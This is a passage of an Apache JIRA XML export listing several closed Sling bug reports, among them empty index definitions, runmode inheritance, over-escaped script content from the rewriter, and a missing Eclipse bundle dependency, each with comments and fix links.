                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 25 weeks, 5 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1hlh4:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11844] Index definitions must not be extracted from empty nodes</title>
                <link>https://issues.apache.org/jira/browse/SLING-11844</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;Under certain conditions, extracted index definitions will contain empty nodes. These are useless and should be skipped. They can also confuse tooling processing the index definitions.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13533584">SLING-11844</key>
            <summary>Index definitions must not be extracted from empty nodes</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="abhigarg">Abhishek Garg</assignee>
                                    <reporter username="rombert">Robert Munteanu</reporter>
                        <labels>
                    </labels>
                <created>Fri, 21 Apr 2023 16:18:24 +0000</created>
                <updated>Fri, 22 Sep 2023 11:20:03 +0000</updated>
                            <resolved>Tue, 19 Sep 2023 08:38:15 +0000</resolved>
                                                    <fixVersion>Content-Package to Feature Model Converter 1.3.4</fixVersion>
                                    <component>Content-Package to Feature Model Converter</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                                                                                <comments>
                            <comment id="17730054" author="abhigarg" created="Wed, 7 Jun 2023 10:30:00 +0000"  >&lt;p&gt;Can we get a little more details under which conditions or what the index definitions look like with empty node types and sample input?&lt;/p&gt;</comment>
                            <comment id="17730079" author="rombert" created="Wed, 7 Jun 2023 11:32:17 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=abhigarg&quot; class=&quot;user-hover&quot; rel=&quot;abhigarg&quot;&gt;abhigarg&lt;/a&gt; - I filed this when I noticed extracted index definitions that look like this&lt;/p&gt;

&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;

{
&lt;span class=&quot;code-quote&quot;&gt;&quot;/oak:index/some-index-1&quot;&lt;/span&gt;: { }.
&lt;span class=&quot;code-quote&quot;&gt;&quot;/oak:index/some-index-2&quot;&lt;/span&gt;: {
    &lt;span class=&quot;code-quote&quot;&gt;&quot;fullTextEnabled&quot;&lt;/span&gt;:&lt;span class=&quot;code-keyword&quot;&gt;true&lt;/span&gt;,
     &lt;span class=&quot;code-quote&quot;&gt;&quot;type&quot;&lt;/span&gt;:&lt;span class=&quot;code-quote&quot;&gt;&quot;lucene&quot;&lt;/span&gt;
    (etc)
}
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I think the tooling should not emit empty nodes. I don&apos;t have a source content-package yet, but maybe you can try and reproduce based on the existing tests? I think just adding an empty folder inside the &lt;tt&gt;_oak_index&lt;/tt&gt; folder will work.&lt;/p&gt;</comment>
                            <comment id="17731939" author="abhigarg" created="Tue, 13 Jun 2023 07:54:40 +0000"  >&lt;p&gt;Added a PR &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-feature-cpconverter/pull/169&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-feature-cpconverter/pull/169&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;cc : &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=rombert&quot; class=&quot;user-hover&quot; rel=&quot;rombert&quot;&gt;rombert&lt;/a&gt;&#160;&lt;/p&gt;</comment>
                            <comment id="17766697" author="rombert" created="Tue, 19 Sep 2023 08:38:15 +0000"  >&lt;p&gt;PR applied, thanks &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=abhigarg&quot; class=&quot;user-hover&quot; rel=&quot;abhigarg&quot;&gt;abhigarg&lt;/a&gt;!&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 5 weeks, 2 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1hg88:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11838] Unexpected runmode inheritance behavior</title>
                <link>https://issues.apache.org/jira/browse/SLING-11838</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;The current behavior how runmodes are evaluated for targeting the right feature model is counterintuitive and can lead to dependency bugs.&lt;/p&gt;

&lt;p&gt;Right now only the location within the direct package is evaluated but if a package is embedded within a package with a specific runmode that leads to problems:&lt;br/&gt;
a) the expectation that everything within an e.g. install.author folder only applies to the author runmode is broken as install folders without author would target the generic model&lt;br/&gt;
b) the implicit dependencies that are made explicit by the converter are broken an embedded package may be broken as a package of a generic install folder that&apos;s nested in a runmode specific install folder within a nesting package would have a dependency on a package not launched (and therefore fails the analyser checks)&lt;/p&gt;

&lt;p&gt;As some people may have established some implicit dependency on this behavior the goal for a fix is to provide a &quot;legacy&quot; mode and log the scenarios to be able to to track usages  and evaluate the impact and only switch on a corresponding inheritance policy when this switch can be considered safe.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13533293">SLING-11838</key>
            <summary>Unexpected runmode inheritance behavior</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="dsuess">Dominik S&#252;&#223;</assignee>
                                    <reporter username="dsuess">Dominik S&#252;&#223;</reporter>
                        <labels>
                    </labels>
                <created>Wed, 19 Apr 2023 21:42:23 +0000</created>
                <updated>Mon, 8 May 2023 12:21:34 +0000</updated>
                            <resolved>Wed, 26 Apr 2023 07:59:26 +0000</resolved>
                                                    <fixVersion>Content-Package to Feature Model Converter 1.3.2</fixVersion>
                                    <component>Content-Package to Feature Model Converter</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
                            <comment id="17714319" author="dsuess" created="Wed, 19 Apr 2023 21:44:07 +0000"  >&lt;p&gt;Created &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-feature-cpconverter/pull/165&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-feature-cpconverter/pull/165&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17716591" author="rombert" created="Wed, 26 Apr 2023 07:59:26 +0000"  >&lt;p&gt;PR merged, thanks for the contribution &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=dsuess&quot; class=&quot;user-hover&quot; rel=&quot;dsuess&quot;&gt;dsuess&lt;/a&gt;!&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 26 weeks, 1 day ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1hefs:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11833] The double quotes in the page js are escaped and cannot run js</title>
                <link>https://issues.apache.org/jira/browse/SLING-11833</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;Edit the content on page:&lt;br/&gt;
&lt;a href=&quot;http://localhost:8080/bin/browser.html/apps/reference/components/pages/base/base.jsp&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;http://localhost:8080/bin/browser.html/apps/reference/components/pages/base/base.jsp&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;then test it on page:&lt;br/&gt;
&lt;a href=&quot;http://localhost:8080/content/apache/sling-apache-org/index.html&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;http://localhost:8080/content/apache/sling-apache-org/index.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The test results are shown in the picture.&lt;/p&gt;

&lt;p&gt;Double quotes within the page are escaped, but in previous versions (e.g. 0.16.2) it was ok and there was no such problem.&lt;/p&gt;

&lt;p&gt;__________________________________________________________________________________________________________________________________&lt;/p&gt;

&lt;p&gt;2023-04-20 update:&lt;/p&gt;

&lt;p&gt;&quot;&amp;amp;&amp;amp;&quot;, &quot;&amp;lt;&quot;, &quot;&amp;gt;&quot; also doesn&apos;t work anymore, e.g:&lt;/p&gt;

&lt;p&gt;if (result.data != null &amp;amp;&amp;amp; result.data != &apos;&apos; &amp;amp;&amp;amp; result.exist == &apos;true&apos;)&lt;/p&gt;

&lt;p&gt;if (result.data != null &amp;amp; amp;&amp;amp; amp; result.data != &apos;&apos; &amp;amp; amp;&amp;amp; amp; result.exist == &apos;true&apos;)&lt;/p&gt;</description>
                <environment></environment>
        <key id="13533126">SLING-11833</key>
            <summary>The double quotes in the page js are escaped and cannot run js</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="dklco">Dan Klco</assignee>
                                    <reporter username="James.R">James Raynor</reporter>
                        <labels>
                    </labels>
                <created>Wed, 19 Apr 2023 01:57:27 +0000</created>
                <updated>Fri, 28 Apr 2023 10:44:27 +0000</updated>
                            <resolved>Mon, 24 Apr 2023 12:55:43 +0000</resolved>
                                    <version>Rewriter 1.3.0</version>
                    <version>App CMS 1.1.2</version>
                                    <fixVersion>Rewriter 1.3.6</fixVersion>
                    <fixVersion>App CMS 1.1.8</fixVersion>
                                    <component>App CMS</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                                                                                <comments>
                            <comment id="17714619" author="dklco" created="Thu, 20 Apr 2023 14:28:40 +0000"  >&lt;p&gt;Looks like this was introduced with &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-10050&quot; class=&quot;external-link&quot; rel=&quot;nofollow&quot;&gt;https://issues.apache.org/jira/browse/SLING-10050&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The problem is that the new HTML5 serializer always escapes character sets instead of having the context of being in a script tag and therefore writing the characters without escaping.&#160;&lt;/p&gt;</comment>
                            <comment id="17714621" author="dklco" created="Thu, 20 Apr 2023 14:30:12 +0000"  >&lt;p&gt;PR created for the fix: &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-rewriter/pull/12&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-rewriter/pull/12&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17714788" author="james.r" created="Fri, 21 Apr 2023 01:26:41 +0000"  >&lt;p&gt;Thanks for fixing the problem.&lt;/p&gt;</comment>
                            <comment id="17717608" author="dklco" created="Fri, 28 Apr 2023 10:44:27 +0000"  >&lt;p&gt;Rewriter released and updated in CMS&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                            <attachment id="13057381" name="2023-04-19--09-56-41.png" size="168562" author="James.R" created="Wed, 19 Apr 2023 01:56:59 +0000"/>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>1.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 25 weeks, 5 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1hdeo:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11829] Response should be resetted before invoking error filters</title>
                <link>https://issues.apache.org/jira/browse/SLING-11829</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;When the error handler is invoked, the chain of actions is currently:&lt;/p&gt;
&lt;ol&gt;
	&lt;li&gt;invoke error filters&lt;/li&gt;
	&lt;li&gt;reset the response&lt;/li&gt;
	&lt;li&gt;call error handler&lt;/li&gt;
&lt;/ol&gt;


&lt;p&gt;Obviously that order is wrong as it resets whatever error filters might have already set on the response (like headers). The order should be :&lt;/p&gt;
&lt;ol&gt;
	&lt;li&gt;reset the response&lt;/li&gt;
	&lt;li&gt;invoke error filters&lt;/li&gt;
	&lt;li&gt;call error handler&lt;/li&gt;
&lt;/ol&gt;


&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;</description>
                <environment></environment>
        <key id="13532656">SLING-11829</key>
            <summary>Response should be resetted before invoking error filters</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="cziegeler">Carsten Ziegeler</assignee>
                                    <reporter username="cziegeler">Carsten Ziegeler</reporter>
                        <labels>
                    </labels>
                <created>Fri, 14 Apr 2023 12:22:58 +0000</created>
                <updated>Fri, 26 May 2023 07:31:38 +0000</updated>
                            <resolved>Fri, 14 Apr 2023 13:18:04 +0000</resolved>
                                    <version>Engine 2.14.0</version>
                                    <fixVersion>Engine 2.15.0</fixVersion>
                                    <component>Engine</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                                                                                <comments>
                            <comment id="17712384" author="cziegeler" created="Fri, 14 Apr 2023 13:18:04 +0000"  >&lt;p&gt;Fixed in &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-engine/commit/47c0c965a49c81bc4725965896ed3db39cfff6ac&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-engine/commit/47c0c965a49c81bc4725965896ed3db39cfff6ac&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 27 weeks, 5 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1hajc:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11826] Missing requirement: Sling IDE Eclipse Core 1.2.2 (org.apache.sling.ide.eclipse-core 1.2.2) requires &apos;osgi.bundle; org.eclipse.equinox.ds 1.2.1&apos; but it could not be found</title>
                <link>https://issues.apache.org/jira/browse/SLING-11826</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;When installing Sling IDE Tools 1.2.2 on a recent Eclipse distribution e.g. 2023-03 you run into the following dependency error&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
Missing requirement: Sling IDE Eclipse Core 1.2.2 (org.apache.sling.ide.eclipse-core 1.2.2) requires &lt;span class=&quot;code-quote&quot;&gt;&apos;osgi.bundle; org.eclipse.equinox.ds 1.2.1&apos;&lt;/span&gt; but it could not be found
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This is due to the bundle requirement towards Equinox DS in &lt;a href=&quot;https://github.com/apache/sling-ide-tooling/blob/68fd958c0c09283b72ea2a0d693cc78083d3f67c/eclipse-core/META-INF/MANIFEST.MF#L9&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-ide-tooling/blob/68fd958c0c09283b72ea2a0d693cc78083d3f67c/eclipse-core/META-INF/MANIFEST.MF#L9&lt;/a&gt; which no longer ships with recent Eclipse versions as Eclipse uses Apache Felix SCR instead under the hood (&lt;a href=&quot;https://bugs.eclipse.org/bugs/show_bug.cgi?id=539655&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://bugs.eclipse.org/bugs/show_bug.cgi?id=539655&lt;/a&gt;).&lt;/p&gt;</description>
                <environment></environment>
        <key id="13532518">SLING-11826</key>
            <summary>Missing requirement: Sling IDE Eclipse Core 1.2.2 (org.apache.sling.ide.eclipse-core 1.2.2) requires &apos;osgi.bundle; org.eclipse.equinox.ds 1.2.1&apos; but it could not be found</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="kwin">Konrad Windszus</assignee>
                                    <reporter username="kwin">Konrad Windszus</reporter>
                        <labels>
                    </labels>
                <created>Thu, 13 Apr 2023 14:20:09 +0000</created>
                <updated>Thu, 25 Sep 2025 10:24:35 +0000</updated>
                            <resolved>Thu, 13 Apr 2023 14:29:00 +0000</resolved>
                                    <version>Sling Eclipse IDE 1.2.2</version>
                                    <fixVersion>Sling Eclipse IDE 1.3.0</fixVersion>
                                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
                            <comment id="17711917" author="kwin" created="Thu, 13 Apr 2023 14:22:00 +0000"  >&lt;p&gt;This is fixed already in the latest SNAPSHOT version which exclusively relies on &lt;tt&gt;Import-Packages&lt;/tt&gt; headers: &lt;a href=&quot;https://github.com/apache/sling-ide-tooling/blob/master/eclipse/eclipse-core/META-INF/MANIFEST.MF&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-ide-tooling/blob/master/eclipse/eclipse-core/META-INF/MANIFEST.MF&lt;/a&gt;.&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="12310000">
                    <name>Duplicate</name>
                                                                <inwardlinks description="is duplicated by">
                                        <issuelink>
            <issuekey id="13542414">SLING-11925</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 27 weeks, 6 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
